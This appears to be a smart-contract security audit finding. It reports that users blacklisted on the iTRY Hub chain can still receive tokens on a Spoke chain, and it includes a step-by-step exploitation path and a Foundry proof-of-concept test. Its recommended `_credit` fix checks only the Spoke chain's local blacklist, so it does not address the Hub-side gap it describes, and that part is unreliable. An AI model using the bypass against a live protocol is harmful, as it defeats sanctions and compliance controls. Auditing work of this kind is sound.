## Title
Cross-Chain Blacklist Bypass: Blacklisted Users Can Receive iTRY Tokens on Spoke Chain

## Summary
The `iTryTokenOFT` contract on spoke chains (MegaETH) does not validate whether a recipient is blacklisted on the source chain (Hub/Ethereum) when processing incoming cross-chain messages. This allows blacklisted users on the Hub chain to receive iTRY tokens on the Spoke chain through third-party bridging, violating the protocol's critical invariant that "Blacklisted users cannot send/receive/mint/burn iTry tokens in any case."

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The protocol enforces that blacklisted users cannot send, receive, mint, or burn iTRY tokens in any circumstance, including cross-chain transfers. The blacklist mechanism should prevent blacklisted addresses from participating in any token operations across all chains.

**Actual Logic:** When the inherited OFT contract's `lzReceive()` function processes an incoming cross-chain message, it calls the internal `_mint()` function to credit tokens to the recipient. The `_mint()` function triggers `_beforeTokenTransfer()` which only checks if the recipient is blacklisted on the **destination chain** (Spoke), not on the **source chain** (Hub). The blacklist mappings are independent between chains [2](#0-1)  and [3](#0-2) , with no synchronization mechanism between them.

Unlike `wiTryOFT` which implements a `_credit()` override to handle blacklisted recipients [4](#0-3) , the `iTryTokenOFT` contract has no such override and relies solely on the `_beforeTokenTransfer` hook which only validates local blacklist status.

**Exploitation Path:**
1. Alice is blacklisted on Hub chain (Ethereum) by the Blacklist Manager
2. Bob (not blacklisted on any chain) holds iTRY tokens on Hub chain
3. Bob initiates a cross-chain transfer from Hub to Spoke chain via `iTryTokenOFTAdapter.send()`, specifying Alice as the recipient
4. On Hub chain: The adapter successfully locks Bob's iTRY tokens (Bob is not blacklisted, so this passes all checks)
5. LayerZero message is sent cross-chain with Alice's address as the recipient
6. On Spoke chain: `iTryTokenOFT.lzReceive()` is triggered by the LayerZero endpoint
7. The inherited OFT contract calls `_credit()` → `_mint(Alice, amount)`
8. `_mint()` triggers `_beforeTokenTransfer(address(0), Alice, amount)` which checks: `msg.sender == minter && from == address(0) && !blacklisted[to]` [5](#0-4) 
9. This check only validates Alice's blacklist status on the **Spoke chain**, not the Hub chain
10. If Alice is not blacklisted on Spoke chain, the minting succeeds and Alice receives iTRY tokens despite being blacklisted on Hub chain

**Security Property Broken:** Violates the critical invariant from README: "Blacklisted users cannot send/receive/mint/burn iTry tokens in any case" [6](#0-5) 

## Impact Explanation
- **Affected Assets**: iTRY tokens on spoke chains (MegaETH)
- **Damage Severity**: Complete bypass of blacklist enforcement for cross-chain token receipts. Blacklisted users (potentially malicious actors, sanctioned addresses, or compromised accounts) can receive and control iTRY tokens on spoke chains, circumventing the protocol's risk management and compliance controls.
- **User Impact**: All users are affected as the blacklist mechanism is a critical security control for the entire protocol. This vulnerability allows blacklisted addresses to re-enter the system through a different chain, potentially enabling money laundering, sanctions evasion, or continued operation by addresses flagged as malicious.

## Likelihood Explanation
- **Attacker Profile**: Any non-blacklisted user (Bob) can be used as an unwitting intermediary. The blacklisted user (Alice) only needs to convince Bob to send tokens cross-chain, or Bob could be a complicit party.
- **Preconditions**: 
  - Alice must be blacklisted on Hub chain but not on Spoke chain (blacklists are independent)
  - Bob must have iTRY tokens on Hub chain and not be blacklisted
  - Cross-chain bridging infrastructure must be operational
- **Execution Complexity**: Single cross-chain transaction. No special timing or complex coordination required.
- **Frequency**: Can be exploited continuously as long as the blacklist states remain unsynchronized between chains.

## Recommendation

Implement a `_credit()` override in `iTryTokenOFT.sol` similar to the pattern used in `wiTryOFT.sol`:

```solidity
// In src/token/iTRY/crosschain/iTryTokenOFT.sol, add after line 177:

/**
 * @dev Override _credit to handle blacklisted recipients on cross-chain transfers
 * @param _to The address of the recipient
 * @param _amountLD The amount of tokens to credit
 * @param _srcEid The source endpoint identifier
 * @return amountReceivedLD The actual amount of tokens received
 */
function _credit(address _to, uint256 _amountLD, uint32 _srcEid)
    internal
    virtual
    override
    returns (uint256 amountReceivedLD)
{
    // If the recipient is blacklisted, emit event and redirect to owner
    // This prevents blacklisted users from receiving tokens via cross-chain transfers
    if (blacklisted[_to]) {
        emit RedistributeFunds(_to, _amountLD);
        return super._credit(owner(), _amountLD, _srcEid);
    } else {
        return super._credit(_to, _amountLD, _srcEid);
    }
}

// Add event definition after line 44:
event RedistributeFunds(address indexed user, uint256 amount);
```

**Alternative Mitigation:** Implement a cross-chain blacklist synchronization mechanism where blacklist changes on Hub chain are automatically propagated to Spoke chains via LayerZero messages. However, this is more complex and introduces additional attack surfaces.

**Additional Consideration:** The protocol should establish operational procedures to ensure blacklists are manually synchronized across chains until an automated solution is implemented.

## Proof of Concept

```solidity
// File: test/Exploit_CrossChainBlacklistBypass.t.sol
// Run with: forge test --match-test test_CrossChainBlacklistBypass -vvv

pragma solidity ^0.8.20;

import {CrossChainTestBase} from "./crosschainTests/crosschain/CrossChainTestBase.sol";
import {console} from "forge-std/console.sol";
import {MessagingFee, SendParam} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oft/interfaces/IOFT.sol";
import {OptionsBuilder} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/libs/OptionsBuilder.sol";

contract Exploit_CrossChainBlacklistBypass is CrossChainTestBase {
    using OptionsBuilder for bytes;

    uint256 constant TRANSFER_AMOUNT = 100 ether;
    uint128 constant GAS_LIMIT = 200000;

    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public override {
        super.setUp();
        deployAllContracts();
        
        // Fund accounts with ETH for gas
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }

    function test_CrossChainBlacklistBypass() public {
        console.log("\n=== Exploit: Cross-Chain Blacklist Bypass ===");
        
        // SETUP PHASE: Blacklist Alice on Hub chain (Sepolia)
        vm.selectFork(sepoliaForkId);
        console.log("\n[SETUP] Blacklisting Alice on Hub chain (Sepolia)");
        
        address[] memory blacklistAddresses = new address[](1);
        blacklistAddresses[0] = alice;
        
        vm.prank(deployer);
        sepoliaITryToken.addBlacklistAddress(blacklistAddresses);
        
        bool aliceBlacklistedOnHub = sepoliaITryToken.hasRole(
            sepoliaITryToken.BLACKLISTED_ROLE(), 
            alice
        );
        console.log("Alice blacklisted on Hub:", aliceBlacklistedOnHub);
        assertEq(aliceBlacklistedOnHub, true, "Alice should be blacklisted on Hub");
        
        // Verify Alice is NOT blacklisted on Spoke chain (OP Sepolia)
        vm.selectFork(opSepoliaForkId);
        bool aliceBlacklistedOnSpoke = opSepoliaOFT.blacklisted(alice);
        console.log("Alice blacklisted on Spoke:", aliceBlacklistedOnSpoke);
        assertEq(aliceBlacklistedOnSpoke, false, "Alice should NOT be blacklisted on Spoke");
        
        // EXPLOIT PHASE: Bob sends iTRY to Alice cross-chain
        vm.selectFork(sepoliaForkId);
        console.log("\n[EXPLOIT] Bob sending iTRY from Hub to Spoke with Alice as recipient");
        
        // Mint iTRY to Bob on Hub
        vm.prank(deployer);
        sepoliaITryToken.mint(bob, TRANSFER_AMOUNT);
        
        uint256 bobBalanceBefore = sepoliaITryToken.balanceOf(bob);
        console.log("Bob's iTRY balance on Hub:", bobBalanceBefore);
        
        // Bob initiates cross-chain transfer to Alice
        vm.startPrank(bob);
        sepoliaITryToken.approve(address(sepoliaAdapter), TRANSFER_AMOUNT);
        
        bytes memory options = OptionsBuilder.newOptions().addExecutorLzReceiveOption(GAS_LIMIT, 0);
        
        SendParam memory sendParam = SendParam({
            dstEid: OP_SEPOLIA_EID,
            to: bytes32(uint256(uint160(alice))),  // Alice as recipient
            amountLD: TRANSFER_AMOUNT,
            minAmountLD: TRANSFER_AMOUNT,
            extraOptions: options,
            composeMsg: "",
            oftCmd: ""
        });
        
        MessagingFee memory fee = sepoliaAdapter.quoteSend(sendParam, false);
        console.log("Sending iTRY from Hub to Spoke with Alice as recipient...");
        
        vm.recordLogs();
        sepoliaAdapter.send{value: fee.nativeFee}(sendParam, fee, payable(bob));
        vm.stopPrank();
        
        // Verify tokens locked on Hub
        uint256 bobBalanceAfter = sepoliaITryToken.balanceOf(bob);
        console.log("Bob's balance after send:", bobBalanceAfter);
        assertEq(bobBalanceAfter, 0, "Bob should have 0 iTRY after sending");
        
        // Relay the cross-chain message
        console.log("\n[RELAY] Relaying message to Spoke chain...");
        CrossChainMessage memory message = captureMessage(SEPOLIA_EID, OP_SEPOLIA_EID);
        relayMessage(message);
        
        // VERIFY PHASE: Alice receives tokens on Spoke despite being blacklisted on Hub
        vm.selectFork(opSepoliaForkId);
        uint256 aliceBalanceOnSpoke = opSepoliaOFT.balanceOf(alice);
        
        console.log("\n[RESULT] Alice's iTRY balance on Spoke:", aliceBalanceOnSpoke);
        console.log("Alice blacklisted on Hub: true");
        console.log("Alice blacklisted on Spoke: false");
        
        // VULNERABILITY CONFIRMED: Alice received tokens despite being blacklisted on Hub
        assertEq(
            aliceBalanceOnSpoke, 
            TRANSFER_AMOUNT, 
            "Vulnerability confirmed: Blacklisted user received tokens cross-chain"
        );
        
        console.log("\n[CRITICAL] Blacklist bypass successful!");
        console.log("Invariant violated: Blacklisted users CAN receive iTRY via cross-chain transfer");
        console.log("Alice (blacklisted on Hub) successfully received 100 iTRY on Spoke chain");
    }
}
```

## Notes

This vulnerability directly violates Critical Invariant #2 from the README. The issue stems from the architectural decision to maintain independent blacklist states across chains without synchronization, combined with the lack of a `_credit()` override in `iTryTokenOFT` (unlike `wiTryOFT` which correctly implements this protection).

The vulnerability is particularly severe because:
1. It completely bypasses blacklist enforcement for cross-chain receipts
2. It requires no privileged access - any non-blacklisted user can act as an intermediary
3. The blacklisted user gains full control of tokens on the spoke chain
4. The attack is repeatable and difficult to prevent without code changes

The recommended fix follows the existing pattern in `wiTryOFT`, maintaining consistency across the codebase while closing this critical security gap.

### Citations

**File:** src/token/iTRY/crosschain/iTryTokenOFT.sol (L35-36)
```text
    /// @notice Mapping of blacklisted addresses
    mapping(address => bool) public blacklisted;
```

**File:** src/token/iTRY/crosschain/iTryTokenOFT.sol (L140-177)
```text
    function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
        // State 2 - Transfers fully enabled except for blacklisted addresses
        if (transferState == TransferState.FULLY_ENABLED) {
            if (msg.sender == minter && !blacklisted[from] && to == address(0)) {
                // redeeming
            } else if (msg.sender == minter && from == address(0) && !blacklisted[to]) {
                // minting
            } else if (msg.sender == owner() && blacklisted[from] && to == address(0)) {
                // redistributing - burn
            } else if (msg.sender == owner() && from == address(0) && !blacklisted[to]) {
                // redistributing - mint
            } else if (!blacklisted[msg.sender] && !blacklisted[from] && !blacklisted[to]) {
                // normal case
            } else {
                revert OperationNotAllowed();
            }
            // State 1 - Transfers only enabled between whitelisted addresses
        } else if (transferState == TransferState.WHITELIST_ENABLED) {
            if (msg.sender == minter && !blacklisted[from] && to == address(0)) {
                // redeeming
            } else if (msg.sender == minter && from == address(0) && !blacklisted[to]) {
                // minting
            } else if (msg.sender == owner() && blacklisted[from] && to == address(0)) {
                // redistributing - burn
            } else if (msg.sender == owner() && from == address(0) && !blacklisted[to]) {
                // redistributing - mint
            } else if (whitelisted[msg.sender] && whitelisted[from] && to == address(0)) {
                // whitelisted user can burn
            } else if (whitelisted[msg.sender] && whitelisted[from] && whitelisted[to]) {
                // normal case
            } else {
                revert OperationNotAllowed();
            }
            // State 0 - Fully disabled transfers
        } else if (transferState == TransferState.FULLY_DISABLED) {
            revert OperationNotAllowed();
        }
    }
```

**File:** src/token/iTRY/iTry.sol (L31-31)
```text
    bytes32 public constant BLACKLISTED_ROLE = keccak256("BLACKLISTED_ROLE");
```

**File:** src/token/wiTRY/crosschain/wiTryOFT.sol (L84-97)
```text
    function _credit(address _to, uint256 _amountLD, uint32 _srcEid)
        internal
        virtual
        override
        returns (uint256 amountReceivedLD)
    {
        // If the recipient is blacklisted, emit an event, redistribute funds, and credit the owner
        if (blackList[_to]) {
            emit RedistributeFunds(_to, _amountLD);
            return super._credit(owner(), _amountLD, _srcEid);
        } else {
            return super._credit(_to, _amountLD, _srcEid);
        }
    }
```

**File:** README.md (L124-124)
```markdown
- Blacklisted users cannot send/receive/mint/burn iTry tokens in any case.
```
